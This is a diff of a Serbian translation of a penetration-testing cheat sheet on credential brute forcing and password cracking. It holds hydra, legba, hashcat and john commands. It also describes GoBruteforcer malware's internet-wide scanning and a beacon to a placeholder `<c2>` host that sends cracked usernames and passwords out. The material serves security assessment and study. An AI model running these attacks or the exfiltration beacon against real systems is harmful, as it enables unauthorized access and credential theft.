@@ -1,10 +1,10 @@
-# Brute Force - Podsetnik
+# Brute Force - CheatSheet
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Podrazumevani podaci za prijavu
+## Podrazumevani kredencijali
 
-**Pretražite Google** da biste pronašli podrazumevane podatke za prijavu za tehnologiju koja se koristi ili **isprobajte ove linkove**:
+**Pretražite Google** za podrazumevane kredencijale tehnologije koja se koristi ili **isprobajte ove linkove**:
 
 - [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
 - [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
@@ -21,7 +21,7 @@
 
 ## **Napravite sopstvene rečnike**
 
-Prikupite što više informacija o cilju i napravite prilagođeni rečnik. Alatke koje mogu pomoći:
+Prikupite što više informacija o cilju i generišite prilagođeni rečnik. Alati koji mogu pomoći:
 
 ### Crunch
 
@@ -51,7 +51,7 @@ cat /path/to/js-urls.txt | python3 getjswords.py
 
 ### [CUPP](https://github.com/Mebus/cupp)
 
-Generišite lozinke na osnovu svojih saznanja o žrtvi (imena, datumi...)
+Generiše lozinke na osnovu vašeg poznavanja žrtve (imena, datumi...)
 
 ```
 python3 cupp.py -h
@@ -59,7 +59,7 @@ python3 cupp.py -h
 
 ### [Wister](https://github.com/cycurity/wister)
 
-Alat za generisanje wordlisti koji vam omogućava da unesete skup reči i napravite više njihovih varijacija, kreirajući jedinstvenu i idealnu wordlistu za određenu metu.
+Alat za generisanje wordlist-a koji vam omogućava da unesete skup reči i napravite više varijacija tih reči, kreirajući jedinstven i idealan wordlist za određenu metu.
 
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
@@ -95,19 +95,19 @@ Finished in 0.920s.
 - [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
 - [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)
 
-## Tok rada bruteforcera na nivou celog interneta (lekcije iz skenera zasnovanih na Go-u)
+## Workflow bruteforcer-a za skeniranje celog interneta (pouke iz skenera zasnovanih na Go-u)
 
-Uočena su sledeća ponašanja u toku skeniranja GoBruteforcer malware-a; konkretne vrednosti zavise od uzorka.<sup>[[1]](#references)</sup>
+Uočeno je sledeće ponašanje u toku skeniranja malware-a GoBruteforcer; konkretne vrednosti zavise od uzorka.<sup>[[1]](#references)</sup>
 
-- Održavajte **worker pool-ove podešene za arhitekturu** (na primer, 95 istovremenih worker-a na `x86_64/arm64`, 85 na `i686`, 35 na `armv5tel` i 50 podrazumevano na drugim arhitekturama), proveravajte aktivne worker-e svake sekunde i pokrećite zamenske kada ih je manje od ciljanog broja; svaki worker obrađuje najviše jednu ciljnu IP adresu pre nego što se ugasi.
-- Generišite **nasumične javne IPv4 adrese**, ali odbacite očigledno nerutabilne i odabrane opsege koje operator izbegava: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, `/8` opsege sa velikim brojem cloud sistema (`3/15/16/56`) i `/8` opsege povezane sa DoD-om (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
-- **Proverite port servisa** kratkim timeout-om (~2s) pre pokušaja **cleartext prijava** (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin preko HTTP/80) i pređite na **malu ugrađenu listu kredencijala** ako preuzimanje kredencijala sa C2 ne uspe.
-- **Eksfiltrirajte pogotke** pomoću malih HTTP GET beacon-a kao što je `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` (šifre servisa poput `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`), uz ponovnu upotrebu uobičajenog browser User-Agent-a kako biste se stopili sa ostalim saobraćajem.
-- **phpMyAdmin spray** može da izvrši brute-force nad oko 80 verovatnih putanja pomoću `GET /index.php?lang=en`, da prepozna PMA markere (`pmahomme` temu/`phpmyadmin.css`/`navigation.php`) i parsira `codemirror.css?v=X.Y.Z` radi izbora načina autentifikacije: verzije `<4.9` prihvataju GET parametre `pma_username`/`pma_password`; verzije `>=4.9` koriste POST sa `server=1`, CSRF `token` i istim kredencijalima.
+- Održavajte **pool-ove worker-a prilagođene arhitekturi** (na primer, 95 istovremenih worker-a na `x86_64/arm64`, 85 na `i686`, 35 na `armv5tel` i podrazumevano 50 na drugim arhitekturama), proveravajte aktivne worker-e svake sekunde i pokrećite zamenske kada ih ima manje od ciljanog broja; svaki worker obrađuje najviše jednu ciljnu IP adresu pre nego što se ugasi.
+- Generišite **nasumične javne IPv4 adrese**, ali odbacujte očigledno nerutabilne opsege i odabrane opsege koje operater izbegava: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, cloud-opsege sa mnogo resursa (`3/15/16/56`) i `/8` opsege povezane sa DoD-om (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
+- **Proverite servisni port** uz kratak timeout (~2s) pre pokušaja **prijavljivanja u čistom tekstu** (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin preko HTTP/80) i pređite na **malu ugrađenu listu kredencijala** ako preuzimanje kredencijala sa C2 ne uspe.
+- **Eksfiltrirajte pogotke** pomoću malih HTTP GET beacon zahteva, kao što je `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` (kodovi servisa kao što su `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`), uz ponovnu upotrebu uobičajenog browser User-Agent-a radi boljeg uklapanja u uobičajeni saobraćaj.
+- **phpMyAdmin spray** može da pokuša brute-force na oko 80 verovatnih putanja koristeći `GET /index.php?lang=en`, da otkrije PMA indikatore (tema `pmahomme`/`phpmyadmin.css`/`navigation.php`) i parsira `codemirror.css?v=X.Y.Z` kako bi odredio tok autentifikacije: verzije `<4.9` prihvataju GET parametre `pma_username`/`pma_password`; verzije `>=4.9` koriste POST sa `server=1`, CSRF `token` i istim kredencijalima.
 
 ## Servisi
 
-Poređani abecedno po nazivu servisa.
+Poređani abecednim redom prema nazivu servisa.
 
 ### AFP
 
@@ -181,7 +181,7 @@ legba ftp --username admin --password wordlists/passwords.txt --target localhost
 
 #### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)
 
-### HTTP Basic Auth
+### Osnovna HTTP autentifikacija
 
 ```bash
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
@@ -204,7 +204,7 @@ hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordl
 # Use https-post-form mode for https
 ```
 
-Za http**s** treba da promenite „http-post-form“ u „**https-post-form**“
+Za http**s** morate da promenite „http-post-form“ u „**https-post-form“
 
 ### **HTTP - CMS --** (W)ordpress, (J)oomla ili (D)rupal ili (M)oodle
 
@@ -345,13 +345,13 @@ nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
 legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
 ```
 
-Da biste koristili **oracle_login** sa **patator**, morate da **instalirate**:
+Da biste koristili **oracle_login** uz **patator**, potrebno je da **instalirate**:
 
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
 
-[Offline OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** and **11.2.0.3**):
+[Offline brute-force OracleSQL heša](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**verzije 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** i **11.2.0.3**):
 
 ```bash
  nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
@@ -384,7 +384,7 @@ legba pgsql --username admin --password wordlists/passwords.txt --target localho
 
 ### PPTP
 
-Možete preuzeti paket `.deb` za instalaciju sa adrese [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)
+Možete preuzeti `.deb` paket za instalaciju sa [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)
 
 ```bash
 sudo dpkg -i thc-pptp-bruter*.deb #Install the package
@@ -410,17 +410,23 @@ legba redis --target localhost:6379 --username admin --password data/passwords.t
 
 ### Rexec
 
+Za ponašanje Rexec servisa sa autentifikacijom lozinkom pogledajte [Pentesting Rexec (512/TCP)](../network-services-pentesting/512-pentesting-rexec.md).
+
 ```bash
 hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
 ```
 
 ### Rlogin
 
+Za autentifikaciju preko pouzdanih hostova i pristup terminalu pogledajte [Pentesting Rlogin (513/TCP)](../network-services-pentesting/pentesting-rlogin.md#rlogin-513tcp).
+
 ```bash
 hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
 ```
 
 ### Rsh
+
+Za autentifikaciju pomoću pouzdanih hostova i udaljene komande pogledajte [Pentesting Rsh (514/TCP)](../network-services-pentesting/pentesting-rlogin.md#rsh-514tcp).
 
 ```bash
 hydra -L <Username_list> rsh://<Victim_IP> -v -V
@@ -511,13 +517,13 @@ legba ssh --username admin --password wordlists/passwords.txt --target localhost
 legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
 ```
 
-#### Slabi SSH ključevi / predvidljivi Debian PRNG
+#### Slabi SSH ključevi / Debian predvidljivi PRNG
 
-Neki sistemi imaju poznate nedostatke u početnoj vrednosti generatora slučajnih brojeva koja se koristi za generisanje kriptografskog materijala. To može znatno da smanji prostor ključeva, koji se zatim može napasti bruteforce alatima kao što je [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Dostupni su i unapred generisani skupovi slabih ključeva, kao što je [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
+Neki sistemi imaju poznate propuste u slučajnom seedu koji se koristi za generisanje kriptografskog materijala. To može znatno da smanji prostor ključeva, koji se zatim može probiti brute-force alatima kao što je [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Dostupni su i unapred generisani skupovi slabih ključeva, kao što je [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
 
 ### STOMP (ActiveMQ, RabbitMQ, HornetQ i OpenMQ)
 
-Tekstualni protokol STOMP je široko korišćen protokol za razmenu poruka koji **omogućava neometanu komunikaciju i interakciju s popularnim servisima za redove poruka**, kao što su RabbitMQ, ActiveMQ, HornetQ i OpenMQ. Pruža standardizovan i efikasan način za razmenu poruka i obavljanje različitih operacija razmene poruka.
+STOMP tekstualni protokol je široko korišćen protokol za razmenu poruka koji **omogućava jednostavnu komunikaciju i interakciju s popularnim servisima za redove poruka**, kao što su RabbitMQ, ActiveMQ, HornetQ i OpenMQ. Omogućava standardizovan i efikasan način razmene poruka i obavljanja različitih operacija razmene poruka.
 
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
@@ -566,14 +572,14 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 
 ## Lokalno
 
-### Online baze podataka za cracking
+### Online baze za cracking
 
-- [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
-- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 sa/bez ESS/SSP i sa vrednošću bilo kog challenge-a)
-- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hash-evi, WPA2 captures i arhive MSOffice, ZIP, PDF...)
+- [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 i SHA1)
+- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 sa/bez ESS/SSP i sa bilo kojom vrednošću challenge-a)
+- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hash-evi, WPA2 capture-i i arhive MSOffice, ZIP, PDF...)
 - [https://crackstation.net/](https://crackstation.net) (Hash-evi)
 - [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
-- [https://gpuhash.me/](https://gpuhash.me) (Hash-evi i hash-evi datoteka)
+- [https://gpuhash.me/](https://gpuhash.me) (Hash-evi i hash-evi fajlova)
 - [https://hashes.org/search.php](https://hashes.org/search.php) (Hash-evi)
 - [https://www.cmd5.org/](https://www.cmd5.org) (Hash-evi)
 - [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
@@ -602,7 +608,7 @@ hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 
 #### Known plaintext zip attack
 
-Morate znati **plaintext** (ili njegov deo) **neke datoteke koja se nalazi unutar** šifrovane zip arhive. Možete proveriti **nazive datoteka i njihove veličine** u šifrovanoj zip arhivi pomoću komande: **`7z l encrypted.zip`**\
+Potrebno je da znate **plaintext** (ili deo plaintext-a) **datoteke koja se nalazi unutar** šifrovane zip arhive. Možete da proverite **nazive i veličine datoteka unutar** šifrovane zip arhive pomoću komande: **`7z l encrypted.zip`**\
 Preuzmite [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) sa stranice sa izdanjima.
 
 ```bash
@@ -643,7 +649,7 @@ qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 
 ### Lozinka vlasnika PDF-a
 
-Da biste crackovali lozinku vlasnika PDF-a, pogledajte ovo: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
+Da biste crackovali lozinku vlasnika PDF-a, pogledajte: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
 ### JWT
 
@@ -685,11 +691,11 @@ hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
 
-### LUKS slika
+### Lucks slika
 
 #### Metod 1
 
-Instalirajte: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
+Instalacija: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
 
 ```bash
 bruteforce-luks -f ./list.txt ./backup.img
@@ -730,15 +736,15 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 
 <figure><img src="../images/image (663).png" alt=""><figcaption></figcaption></figure>
 
-### DPAPI Master Key
+### Glavni ključ DPAPI-ja
 
 Koristite [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py), a zatim john
 
 ### Open Office kolona zaštićena lozinkom
 
-Ako imate xlsx datoteku sa kolonom zaštićenom lozinkom, možete da je zaštitite uklonite:
+Ako imate xlsx datoteku sa kolonom zaštićenom lozinkom, možete da je zaštitu uklonite:
 
-- **Otpremite je na Google Drive** i lozinka će biti automatski uklonjena
+- **Otpremite je na Google Drive** i lozinka će automatski biti uklonjena
 - Da biste je **ručno uklonili**:
 
 ```bash
@@ -761,7 +767,7 @@ crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
 
 ## Alati
 
-**Primeri hash-eva:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)
+**Primeri hash vrednosti:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)
 
 ### Hash-identifier
 
@@ -770,16 +776,16 @@ hash-identifier
 > <HASH>
 ```
 
-### Liste lozinki
+### Liste reči
 
 - **Rockyou**
 - [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
 - [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
 - [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
 
-### **Alati za generisanje lista lozinki**
+### **Alati za generisanje lista reči**
 
-- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Napredni generator keyboard-walk obrazaca sa podesivim osnovnim znakovima, mapom tastature i putanjama.
+- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Napredni generator sekvenci pritisaka na tastere sa podesivim osnovnim znakovima, mapom tastature i putanjama.
 
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
@@ -787,7 +793,7 @@ kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction
 
 ### John mutation
 
-Pročitajte _**/etc/john/john.conf**_ i podesite ga
+Pročitajte _**/etc/john/john.conf**_ i konfigurišite ga.
 
 ```bash
 john --wordlist=words.txt --rules --stdout > w_mutated.txt
@@ -796,21 +802,21 @@ john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 
 ### Hashcat
 
-#### Hashcat napadi
+#### Napadi u Hashcat-u
 
-- **Wordlist attack** (`-a 0`) sa pravilima
+- **Wordlist attack** (`-a 0`) with rules
 
-**Hashcat** već dolazi sa **fasciklom koja sadrži pravila**, ali [**ovde možete pronaći druga zanimljiva pravila**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
+**Hashcat** već dolazi sa **folderom koji sadrži rules**, ali [**ovde možete pronaći i druga zanimljiva rules**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
 
 ```
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
 
-#### Objasnite i profilirajte datoteke sa pravilima
+#### Objasnite i profilšite datoteke pravila
 
-Hashcat pravila izvršavaju opkode sleva nadesno. Ovo je lako pogrešno protumačiti kada operacije deluju na poziciji nula: `^e ^h ^t` dodaje `e`, zatim `h`, pa `t` na početak, čime se `password` pretvara u `thepassword`. Zamene porede bajtove uz razlikovanje velikih i malih slova, pa pravilo kao što je `sa@` ne menja ništa ako je `A` veliko slovo. Testirajte nepoznata pravila na reprezentativnim osnovnim rečima koje sadrže mala, velika i kombinovana slova pre nego što utrošite GPU vreme.<sup>[[6]](#references)[[9]](#references)</sup>
+Hashcat rules izvršavaju opcodes sleva nadesno. Ovo se lako pogrešno protumači kada operacije deluju na poziciji nula: `^e ^h ^t` dodaje `e`, zatim `h`, pa `t` na početak i tako menja `password` u `thepassword`. Zamene su poređenja bajtova koja razlikuju velika i mala slova, pa pravilo poput `sa@` ne menja ništa za veliko slovo `A`. Testirajte nepoznata pravila na reprezentativnim osnovnim rečima pisanim malim, velikim i kombinovanim slovima pre nego što utrošite vreme GPU-a na njih.<sup>[[6]](#references)[[9]](#references)</sup>
 
-[HashcatRosetta](https://github.com/bandrel/HashcatRosetta) može da prikaže svakog kandidata tokom obrade i da sumira raspodelu opkoda u celoj datoteci sa pravilima. Statički broj opkoda pokazuje da li datoteka uglavnom dodaje znakove na kraj ili početak, zamenjuje ih ili ih skraćuje. To ne dokazuje da će pravilo probiti lozinku, ali pomaže pri izboru skupa pravila koji odgovara uočenim obrascima lozinki ciljne populacije.<sup>[[6]](#references)[[9]](#references)</sup>
+[HashcatRosetta](https://github.com/bandrel/HashcatRosetta) može da prikaže svakog međukandidata i da sažme raspodelu opcode-ova u celoj datoteci pravila. Statički broj opcode-ova otkriva da li datoteka uglavnom dodaje znakove na kraj ili početak, zamenjuje ih ili ih skraćuje. To ne dokazuje da će neko pravilo probiti lozinku, ali pomaže u izboru skupa pravila koji odgovara uočenim obrascima lozinki ciljne populacije.<sup>[[6]](#references)[[9]](#references)</sup>
 
 ```bash
 uv tool install git+https://github.com/bandrel/HashcatRosetta.git
@@ -818,9 +824,9 @@ hashcat-rosetta --explain '^e ^h ^t' --baseword password
 hashcat-rosetta rules.rule --analyze-rules
 ```
 
-#### Smanjite broj redundantnih pravila pomoću debug logova
+#### Smanjite redundantna pravila pomoću debug logova
 
-Hashcat debug režim beleži transformacije pravila odvojeno od uobičajenog izlaza statusa i rezultata. Režim `4` zapisuje `baseword:rule:candidate`; režim `5` dodaje izvornu wordlistu. Uvek eksplicitno podesite `--debug-file`. U suprotnom, Hashcat otvara `hashcat.debugfile` u svom direktorijumu profila, a preusmeravanje stdout-a hvata tok konzolnog izlaza umesto ovih zapisa. Debug datoteke se otvaraju u režimu dodavanja, zato uklonite ili rotirajte staru datoteku pre novog merenja i zaštitite je jer sadrži baseword-e i kandidate u čistom tekstu.<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>
+Hashcat debug režim beleži transformacije pravila odvojeno od uobičajenog statusnog i izlaznog sadržaja sa rezultatima. Režim `4` zapisuje `baseword:rule:candidate`; režim `5` dodaje izvornu wordlistu. Uvek eksplicitno podesite `--debug-file`. U suprotnom, Hashcat otvara `hashcat.debugfile` u svom profilnom direktorijumu, a preusmeravanje stdout-a hvata izlaz konzole, ne ove zapise. Debug datoteke se otvaraju u režimu dodavanja, zato uklonite ili rotirajte staru datoteku pre novog merenja i zaštitite je jer sadrži baseword-ove i kandidate u čistom tekstu.<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>
 
 ```bash
 rm -f debug.txt
@@ -832,12 +838,12 @@ hashcat-rosetta debug.txt --wordlists --detail
 hashcat-rosetta debug.txt --export report.json --format json
 ```
 
-Koristite `frequency` da pronađete pravila koja se najčešće primenjuju, `basewords` da izmerite pokrivenost različitih ulaznih reči, a `candidates` da prebrojite različite izlaze. Rangiranje kandidata obično je najbolje mesto za početak smanjivanja, jer često primenjeno pravilo i dalje može da mapira mnogo ulaznih reči na duplirane kandidate. Kopirajte najkorisnija pravila u manju datoteku, ponovo je pokrenite nad preostalim hash-evima i uporedite izveštaje između pokretanja. Režim `5` takođe pokazuje da li svaka izvorna wordlist datoteka doprinosi korisnim basewords; forsirajte parsiranje pomoću `--debug-mode 4` ili `--debug-mode 5` kada dvotačke u podacima čine automatsko otkrivanje dvosmislenim.<sup>[[6]](#references)[[9]](#references)</sup>
+Koristite `frequency` da biste pronašli pravila koja se najčešće primenjuju, `basewords` da biste izmerili pokrivenost različitih ulaza, a `candidates` da biste prebrojali različite izlaze. Rangiranje kandidata obično je najbolje polazište za skraćivanje, jer često primenjeno pravilo i dalje može da preslika mnogo ulaza u duplirane kandidate. Kopirajte najvrednija pravila u manju datoteku, ponovo je pokrenite nad preostalim hash-evima i uporedite izveštaje između pokretanja. Režim `5` takođe pokazuje da li svaka izvorna wordlist datoteka doprinosi korisnim osnovnim rečima; nametnite parsiranje pomoću `--debug-mode 4` ili `--debug-mode 5` kada dvotačke u podacima onemogućavaju nedvosmisleno automatsko prepoznavanje.<sup>[[6]](#references)[[9]](#references)</sup>
 
 - **Wordlist combinator** napad
 
-Moguće je da se pomoću hashcat-a **kombinuju 2 wordlist datoteke u 1**.\
-Ako je prva lista sadržala reč **„hello“**, a druga 2 reda sa rečima **„world“** i **„earth“**, generisaće se reči `helloworld` i `helloearth`.
+Moguće je **kombinovati 2 wordlist datoteke u 1** pomoću hashcat-a.\
+Ako je prva lista sadržala reč **„hello“**, a druga dva reda sa rečima **„world“** i **„earth“**, generisale bi se reči `helloworld` i `helloearth`.
 
 ```bash
 # This will combine 2 wordlists
@@ -850,20 +856,20 @@ hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
 ```
 
-#### Napadi kombinovanja vođeni gramatikom (primer šifrovanog Office dokumenta)
+#### Napadi kombinovanjem vođeni gramatikom (primer šifrovanog Office dokumenta)
 
-Lozinka može biti duga i sadržati nekoliko klasa znakova, a da ipak ima mali **efektivni prostor pretrage** ako prati poznatu gramatiku. Za šifrovani Office dokument pribavljen tokom ovlašćene procene, `office2john.py` izdvaja zapis za proveru lozinke; to omogućava lokalno pogađanje bez blokada, ograničavanja pokušaja ili MFA. Time se ne zaobilazi šifrovanje dokumenta.<sup>[[2]](#references)[[5]](#references)</sup>
+Lozinka može biti duga i sadržati nekoliko klasa znakova, a ipak imati mali **efektivni prostor pretrage** ako prati poznatu gramatiku. Za šifrovani Office dokument pribavljen tokom ovlašćene procene, `office2john.py` izdvaja zapis za proveru lozinke; to omogućava lokalno pogađanje bez zaključavanja naloga, ograničavanja broja pokušaja ili MFA. Time se ne zaobilazi šifrovanje dokumenta.<sup>[[2]](#references)[[5]](#references)</sup>
 
-Uklonite polje sa nazivom datoteke koje John dodaje na početak, tako da Hashcat dobije samo verifikator:<sup>[[2]](#references)</sup>
+Uklonite polje imena datoteke koje John dodaje na početak, tako da Hashcat dobije samo verifikator:<sup>[[2]](#references)</sup>
 
 ```bash
 python3 /path/to/office2john.py secrets.xlsx | sed 's/^[^:]*://' > office.hash
 head -c 40 office.hash; echo
 ```
 
-Izaberite `-m` na osnovu izdvojenog prefiksa, a ne ekstenzije datoteke. Hashcat mapira `$office$*2007*`, `$office$*2010*` i `$office$*2013*` na režime `9400`, `9500` i `9600`; zastareli zapisi `$oldoffice$0/$1` i `$oldoffice$3/$4` koriste režime `9700` i `9800`, tim redom.<sup>[[3]](#references)</sup>
+Izaberite `-m` na osnovu izdvojenog prefiksa, a ne ekstenzije datoteke. Hashcat mapira `$office$*2007*`, `$office$*2010*` i `$office$*2013*` na režime `9400`, `9500` i `9600`; zapisi starog formata `$oldoffice$0/$1` i `$oldoffice$3/$4` koriste režime `9700` i `9800`, tim redom.<sup>[[3]](#references)</sup>
 
-Ako informacije o ponovnoj upotrebi lozinki, pravilima, nagoveštajima ili od osoba koje poznaju korisnika otkriju gramatiku kao što je `<word><number><optional !><word>`, formirajte prefiks koji se može nezavisno enumerisati kao levi rečnik. Ovaj primer testira brojeve od `0` do `99`; zamenite opseg i transformacije onima koje podržavaju dokazi prikupljeni tokom procene.<sup>[[5]](#references)</sup>
+Ako informacije o ponovnoj upotrebi lozinki, pravilima, nagoveštajima ili od osoba koje poznaju korisnika otkriju obrazac kao što je `<word><number><optional !><word>`, napravite nezavisno nabrojiv prefiks kao levi rečnik. Ovaj primer testira brojeve od `0` do `99`; zamenite opseg i transformacije onima koje podržavaju dokazi iz procene.<sup>[[5]](#references)</sup>
 
 ```bash
 while IFS= read -r word; do
@@ -873,13 +879,13 @@ while IFS= read -r word; do
 done < words.txt > wordsAndNumbers.txt
 ```
 
-Hashcat režim napada `1` dodaje svaki red iz desnog rečnika svakom redu iz levog rečnika, tako da datoteke sa `L` i `R` redova daju `L × R` kandidata pre primene pravila. Sledeća komanda je namenjena isključivo zapisu nasleđenog formata `$oldoffice$3/$4`; za druge Office formate promenite režim.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
+Hashcat režim napada `1` dodaje svaki red iz desničkog rečnika svakom redu iz levog rečnika, tako da datoteke sa `L` i `R` redova daju `L × R` kandidata pre primene bilo kojih pravila. Sledeća komanda namenjena je konkretno zapisu legacy formata `$oldoffice$3/$4`; promenite režim za druge Office formate.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
 
 ```bash
 hashcat -m 9800 -a 1 office.hash wordsAndNumbers.txt english-88k-upper.txt
 ```
 
-Ovaj obrazac pretprocesiranja može se primeniti i na druge offline-proverljive formate: enumerišite samo moguće varijante velikih i malih slova, datuma, separatora, cifara ili interpunkcije za jednu komponentu, a zatim je kombinujte sa preostalom komponentom, umesto da brute-force-ujete nominalnu punu dužinu.<sup>[[4]](#references)[[5]](#references)</sup>
+Ovaj obrazac predobrade može se primeniti i na druge formate koji se mogu proveriti offline: nabrojte samo verovatne varijante velikih i malih slova, datume, separatore, cifre ili interpunkciju za jednu komponentu, a zatim je kombinujte sa preostalom komponentom umesto da brute-force-ujete nominalnu punu dužinu.<sup>[[4]](#references)[[5]](#references)</sup>
 
 - **Mask attack** (`-a 3`)
 
@@ -917,13 +923,13 @@ hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
 
 #### Proverite `.hcmask` datoteke pre pokretanja
 
-Neispravna linija može se prevideti među ispravnim maskama, zato proverite celu datoteku i njen procenjeni keyspace pre pokretanja attack-a. HashcatRosetta prijavljuje liniju sa greškom i vraća status različit od nule ako je neka maska neispravna, što ovu proveru čini pogodnom za scripts ili CI.<sup>[[6]](#references)[[9]](#references)</sup>
+Neispravna linija može da se izgubi među važećim maskama, zato proverite celu datoteku i procenjeni keyspace pre pokretanja napada. HashcatRosetta prijavljuje liniju sa greškom i vraća status različit od nule ako je bilo koja maska neispravna, pa je ova provera pogodna za skripte ili CI.<sup>[[6]](#references)[[9]](#references)</sup>
 
 ```bash
 hashcat-rosetta masks.hcmask --verify-masks
 ```
 
